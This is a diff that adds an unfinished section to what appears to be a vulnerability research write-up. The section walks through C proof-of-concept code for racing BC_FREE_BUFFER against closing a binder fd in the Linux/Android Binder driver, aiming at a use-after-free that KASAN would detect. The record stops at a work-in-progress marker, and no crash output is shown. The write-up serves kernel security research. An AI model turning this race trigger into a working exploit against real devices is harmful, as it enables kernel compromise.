@@ -509,3 +509,305 @@ static int binder_thread_write(struct binder_proc *proc,
 
 So, we simply need to `write` a command of `BC_FREE_BUFFER`, which will trigger the freeing of the `buffer`, hence also freeing the `node` itself, using the `binder_ref` we have. 
 
+We can now begin writing the POC. This POC is a lot less trivial than the last one, especially since its a more thorough exploration in the Binder realm, but also due to it being a race with a very tight exploit window. 
+
+The full flow of the POC as I imagine it, should be:
+1. Thread/Process A initialises its binder `fd`, then becomes the context manager (this lets us easily access it with handle *0*). It then signals B.
+2. Thread/Process B initialises its binder `fd`, and then sends a transaction buffer to A. When this happens, Binder creates a `binder_ref` to B's `binder_node` in A. It then signals A.
+3. A then reads the buffer pointer from the transaction (crucial for us to use `BC_FREE_BUFFER` later), and then signals B.
+4. Simultaneously, they are ready for the race, A triggers it via `BC_FREE_BUFFER`, while B triggers it with `close(fd)`.
+
+from future import: *We will NOT use a thread here. I tried it, and it does not work due to the context manager receiving transactions from a node in its same `binder_proc`*.
+
+Firstly, we should create a function to setup binder for each of the processes:
+```c
+int __binder_setup(void) {
+  int fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
+  assert(MAP_FAILED != mmap(NULL, MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0));
+  return fd;
+}
+```
+
+Now, we want to create a functionality to become context manager:
+```c
+void __become_ctx_manager(int fd) {
+  uint32_t dummy = 0;
+  ioctl(fd, BINDER_SET_CONTEXT_MGR, &dummy);
+}
+```
+
+Following to [2], we want to send a transaction (`BINDER_TYPE_BINDER`) to the context manager to create us a `binder_node` and a `binder_ref` in the context manager to our `binder_node` (this all happens in `binder_translate_binder`):
+```c
+void __send_initial_transaction(int fd, int target) {
+  /*
+   * Create a valid binder transaction so the ctx_manager
+   * holds a binder_ref to the clients binder_node.
+   */
+  struct flat_binder_object obj = {.hdr.type = BINDER_TYPE_BINDER,
+                                   .flags = 0x7f | (1 << 8),
+                                   .binder = (uintptr_t)0xdeadbeef,
+                                   .cookie = 0};
+  uint64_t offsets[] = {0};
+
+  struct transaction_data data = {.cmd = BC_TRANSACTION,
+                                  .tr.target.handle = target,
+                                  .tr.code = 1,
+                                  .tr.flags = 0,
+                                  .tr.data_size = sizeof(obj),
+                                  .tr.offsets_size = sizeof(offsets),
+                                  .tr.data.ptr.buffer = (uintptr_t)&obj,
+                                  .tr.data.ptr.offsets = (uintptr_t)offsets};
+
+  struct binder_write_read bwr = {
+      .write_size = sizeof(data),
+      .write_buffer = (uintptr_t)&data,
+      .read_size = 0,
+  };
+
+  ioctl(fd, BINDER_WRITE_READ, &bwr);
+} 
+```
+
+We do not care for the object we pass, as we just need to reach the following flow in `binder_translate_binder()`:
+```c
+static int binder_translate_binder(struct flat_binder_object *fp,
+				   struct binder_transaction *t,
+				   struct binder_thread *thread)
+{
+	struct binder_node *node;
+	struct binder_proc *proc = thread->proc;
+	struct binder_proc *target_proc = t->to_proc;
+	struct binder_ref_data rdata;
+	int ret = 0;
+	
+	// --> If you can find the node buffer
+	// --> return the associated node.
+	// --> Otherwise, create a new node (what we want!).
+	node = binder_get_node(proc, fp->binder);
+	if (!node) {
+		node = binder_new_node(proc, fp);
+		if (!node)
+			return -ENOMEM;
+	}
+	[...]
+	
+	// --> Create binder_ref to the node.
+	ret = binder_inc_ref_for_node(target_proc, node,
+			fp->hdr.type == BINDER_TYPE_BINDER,
+			&thread->todo, &rdata);
+	if (ret)
+		goto done;
+
+	[...]
+	
+done:
+	binder_put_node(node);
+	return ret;
+}
+```
+
+And to ensure we're creating a `binder_ref`, let's look at `binder_inc_ref_for_node()`:
+
+```c
+static int binder_inc_ref_for_node(struct binder_proc *proc,
+			struct binder_node *node,
+			bool strong,
+			struct list_head *target_list,
+			struct binder_ref_data *rdata)
+{
+	struct binder_ref *ref;
+	struct binder_ref *new_ref = NULL;
+	int ret = 0;
+
+	binder_proc_lock(proc);
+	// --> Should not exist, thus we'll create a ref.
+	ref = binder_get_ref_for_node_olocked(proc, node, NULL);
+	if (!ref) {
+		binder_proc_unlock(proc);
+		new_ref = kzalloc(sizeof(*ref), GFP_KERNEL);
+		if (!new_ref)
+			return -ENOMEM;
+		binder_proc_lock(proc);
+		ref = binder_get_ref_for_node_olocked(proc, node, new_ref);
+	}
+	ret = binder_inc_ref_olocked(ref, strong, target_list);
+	*rdata = ref->data;
+	binder_proc_unlock(proc);
+	if (new_ref && ref != new_ref)
+		/*
+		 * Another thread created the ref first so
+		 * free the one we allocated
+		 */
+		kfree(new_ref);
+	return ret;
+}
+```
+
+Now, in order to call `BC_FREE_BUFFER` that will actually effect our node, we must provide the actual buffer that's passed. To do so, we need to parse the given buffer in the transaction from the client. We'll do it like so:
+```c
+uint64_t __read_buffer_from_transaction(int fd) {
+  /* The client sends its data, and we need to read the
+   * buffer pointer in order to pass it in BC_FREE_BUFFER
+   * for the race.
+   */
+  uint8_t read_buf[256] = {
+      0,
+  };
+  struct binder_write_read bwr = {.read_size = sizeof(read_buf),
+                                  .read_buffer = (uintptr_t)read_buf};
+  ioctl(fd, BINDER_WRITE_READ, &bwr);
+
+  /* Parse each command, but specifically
+   * find the first transaction cmd (which is what we send)
+   * and extract the buffer.
+   */
+  uint8_t *cur = read_buf;
+  uint8_t *end = read_buf + bwr.read_consumed;
+  while (cur < end) {
+    uint32_t cmd = *(uint32_t *)cur;
+    cur += sizeof(uint32_t);
+    if (cmd == BR_TRANSACTION) {
+      struct binder_transaction_data *td =
+          (struct binder_transaction_data *)cur;
+      return td->data.ptr.buffer;
+    }
+
+    cur += _IOC_SIZE(cmd);
+  }
+
+  return NULL;
+}
+```
+
+And we can afterwards free the buffer like so:
+```c
+void __free_buffer(int fd, uint64_t buffer_ptr) {
+  uint32_t free_cmd[] = {BC_FREE_BUFFER, buffer_ptr};
+  struct binder_write_read bwr = {.write_size = sizeof(free_cmd),
+                                  .write_buffer = (uintptr_t)free_cmd};
+
+  ioctl(fd, BINDER_WRITE_READ, &bwr);
+}
+```
+
+Now, due to the fact we're using two different processes (as threads do not work for reasons mentioned above), we'll need to create some form of IPC synchronisation. We'll do so using pipes, for simplicity:
+```c
+int sync_pipe[2];
+
+void pipe_signal(void) {
+  char byte = 1;
+  write(sync_pipe[1], &byte, 1);
+}
+
+void pipe_wait(void) {
+  char byte;
+  read(sync_pipe[0], &byte, 1);
+}
+```
+
+Now, we can put it all together:
+```c
+void _ctx_manager_race(void) {
+  __pin_to_cpu(0);
+
+  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
+  int fd = __binder_setup();
+  __become_ctx_manager(fd);
+  printf(INFO_PRINT "Became context manager, waiting for client...\n");
+
+  /* Signal client to initialize itself and sync */
+  pipe_signal();
+
+  /* Read the buffer and sync to race */
+  uint64_t buf_ptr = __read_buffer_from_transaction(fd);
+  printf(INFO_PRINT "Read buffer from transaction: %p\n", (void *)buf_ptr);
+  pipe_signal();
+
+  /* Client is ready to race, free the buffer using binder_free_node */
+  printf(INFO_PRINT "Context manager triggering race via free buffer...\n");
+  __free_buffer(fd, buf_ptr);
+}
+
+void _client_race(void) {
+  __pin_to_cpu(1);
+
+  /* Initialize binder then wait to create binder_ref in ctx manager */
+  printf(INFO_PRINT "Initializing client fd...\n");
+  int fd = __binder_setup();
+  pipe_wait();
+
+  /* 0 for target means we send to ctx manager. */
+  printf(INFO_PRINT "Sending initial transaction to create a binder_ref...\n");
+  __send_initial_transaction(fd, 0);
+  pipe_wait();
+
+  /* Race: close fd → binder_deferred_release → binder_release_work */
+  printf(INFO_PRINT "Client triggering race via binder_release_work...\n");
+  ioctl(fd, BINDER_THREAD_EXIT, 0);
+  close(fd);
+}
+
+int main(void) {
+  pipe(sync_pipe);
+
+  pid_t pid = fork();
+  if (0 == pid) {
+    /* Child process: context manager. */
+    _ctx_manager_race();
+    exit(0);
+  }
+  _client_race();
+  wait(NULL);
+}
+```
+
+Now, unfortunately, the race window is really tight, which means we need to loop a lot of times until we can get a KASAN hit. Let's introduce that change:
+```c
+void _ctx_manager_race(void) {
+  __pin_to_cpu(0);
+
+  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
+  int fd = __binder_setup();
+  __become_ctx_manager(fd);
+  printf(INFO_PRINT "Became context manager, waiting for client...\n");
+
+  /* Signal client to initialize itself and sync */
+  pipe_signal();
+  
+  for (;;) {
+    /* Read the buffer and sync to race */
+    uint64_t buf_ptr = __read_buffer_from_transaction(fd);
+    printf(INFO_PRINT "Read buffer from transaction: %p\n", (void *)buf_ptr);
+    pipe_signal();
+
+    /* Client is ready to race, free the buffer using binder_free_node */
+    printf(INFO_PRINT "Context manager triggering race via free buffer...\n");
+    __free_buffer(fd, buf_ptr);
+  }
+}
+
+void _client_race(void) {
+  __pin_to_cpu(1);
+
+  /* Initialize binder then wait to create binder_ref in ctx manager */
+  printf(INFO_PRINT "Initializing client fd...\n");
+  int fd = __binder_setup();
+  pipe_wait();
+  
+  for (;;) {
+    int n_fd = dup(fd);
+    /* 0 for target means we send to ctx manager. */
+    printf(INFO_PRINT "Sending initial transaction to create a binder_ref...\n");
+    __send_initial_transaction(n_fd, 0);
+    pipe_wait();
+
+    /* Race: close fd → binder_deferred_release → binder_release_work */
+    printf(INFO_PRINT "Client triggering race via binder_release_work...\n");
+    ioctl(n_fd, BINDER_THREAD_EXIT, 0);
+    close(n_fd);
+  }
+}
+```
+
+Let's see if we get a *KASAN* hit:
+... (WIP).
